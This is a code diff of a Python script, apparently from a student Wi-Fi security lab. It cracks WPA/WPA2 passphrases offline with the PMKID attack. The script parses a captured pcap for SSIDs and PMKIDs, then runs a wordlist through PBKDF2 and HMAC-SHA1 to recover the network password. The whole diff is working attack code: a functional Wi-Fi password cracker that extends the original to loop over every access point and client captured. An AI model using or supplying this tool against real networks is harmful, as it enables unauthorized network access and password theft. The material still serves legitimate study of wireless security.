@@ -8,49 +8,93 @@ from binascii import a2b_hex, b2a_hex
 from pbkdf2 import *
 import hmac, hashlib
 
+
+# key: MAC of AP
+# value: the SSID
+ssids = dict()
+
+# 2d dict
+# key1: MAC of AP
+# key2: MAC of Client
+# value: pmkid read in packet 1 of 4
+pmkids = dict()
+
 # Reading the pcap file
 cap = rdpcap("PMKID_handshake.pcap")
+for p in cap:
+    # for beacon, add AP-mac and SSID to variable ssids
+    if p.subtype == 8 and p.type == 0:
+        if p.addr2 not in ssids:
+            ssids[p.addr2] = p.info
+        elif ssids[p.addr2] != p.info:
+            print("ERROR AP with multiple SSID doesn't supported")
+            exit(1)
 
-# Find the SSID
-ssid = cap[0].info
+    # for packet 1 of 4 add AP-mac, Client-mac and pmkid to variable pmkids
+    if p.type == 2 and p.subtype == 8 and p.FCfield == "from-DS":
+        Clientmac = p.addr1
+        APmac = p.addr2
 
-"""
-TO DO : récupérer dynamiquement les adresses MAC de l'AP et du client ?
+        # if AP-mac isn't present, make a dict() in pmkids
+        if APmac in pmkids:
+            pmkids[APmac][Clientmac] = raw(p)[-20:-4]
+        else:
+            pmkids[APmac] = {
+                Clientmac: raw(p)[-20:-4]
+            }
+            
+# Attack of pmkid
+# ssid: the SSID of wifi
+# apmac: The MAC of the AP "FF:FF:FF:FF...."
+# clientmac: The MAC of the Client "FF:FF:FF:FF...."
+# pmkid (bytes): The pmkid found in packet 1 of 4
+# return True if password found
+def hack_pmkid(ssid, apmac, clientmac, pmkid):
+    apmac = a2b_hex(apmac.replace(':', ''))
+    clientmac = a2b_hex(clientmac.replace(':', ''))
 
-for packet in wpa :
-    # The first packet with type, subtype and proto at 0 is an Association Request
-    # It contains part of the info we seek (MAC address of AP and STA and ssid)
-    # We check if the packet is and Asso Req from the network we want to attack
-    if (packet.type == 0x2) and (packet.subtype == 0x8) and (packet.proto == 0x0) and (packet.info == ssid):
-        # AP MAC address
-        APmac = a2b_hex((packet.addr1).replace(":", ""))
-        # STA MAC address
-        Clientmac = a2b_hex((packet.addr2).replace(":", ""))
-        break
-"""
+    # Read the list of passphrases from a text file
+    line = 0
+    with open('passphrases.txt') as file :
+        for passPhrase in file.readlines() :
+            # remove new-line char
+            passPhrase = passPhrase.strip()
 
-# The PMKID is contained in packet 146 (Key Exchange Packet 1 of 4)
-packet = cap[145]
-# Storing the client and the AP's MAC addresses
-Clientmac = a2b_hex((packet.addr1).replace(":", ""))
-APmac = a2b_hex((packet.addr2).replace(":", ""))
-# Storing the PMKID sent by the AP
-pmkid = raw(packet)[-20:-4]
+            # Calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
+            pmk = pbkdf2(hashlib.sha1, passPhrase.encode(), ssid, 4096, 32)
 
-# Create a list of passphrases from a text file
-with open('passphrases.txt') as file :
-    for passPhrase in file.readlines() :
-        passPhrase = passPhrase.strip()
+            # Calculating a new PMKID from a passphrase
+            calc_pmkid = hmac.new(pmk, b"PMK Name" + apmac + clientmac, hashlib.sha1)
+            calc_pmkid = calc_pmkid.digest()[:16]
 
-        # Calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
-        pmk = pbkdf2(hashlib.sha1, passPhrase.encode(), ssid, 4096, 32)
+            # show the actual password tested (replace the previous line)
+            print("\r[ ] Test password #" + str(line) , ": ", passPhrase, end="")
+            line += 1
 
-        # Calculating a new PMKID from a passphrase
-        calc_pmkid = hmac.new(pmk, b"PMK Name" + APmac + Clientmac, hashlib.sha1)
-        calc_pmkid = calc_pmkid.digest()[:16]
-        print("Passphrase tested : ", passPhrase)
+            # Comparing the PMKID calculated with the one found in the pcap file
+            if calc_pmkid == pmkid :
+                print("\r[+] PASSPHRASE FOUND : ", passPhrase)
+                return True
+        print("")
+    return False
 
-        # Comparing the PMKID calculated with the one found in the pcap file
-        if calc_pmkid == pmkid :
-            print("PASSPHRASE FOUND : ", passPhrase)
-            exit(0)
+# True if a password found
+hacked = False
+
+# for each AP-mac found in pcap
+for apmac in ssids:
+    if apmac not in pmkids:
+        print("[-] Don't have information to hack the wifi :",  ssids[apmac])
+    else:
+        # for each Client-mac in packet 1 of 4 with apmac
+        for clientmac in pmkids[apmac]:
+            print("[+] Hack wifi", ssids[apmac], "with client", clientmac)
+            # Apply the attack
+            ret = hack_pmkid(ssids[apmac], apmac, clientmac, pmkids[apmac][clientmac])
+            if ret:
+                hacked = True
+                break
+
+# return error code if no password found
+if not hacked:
+    exit(1)
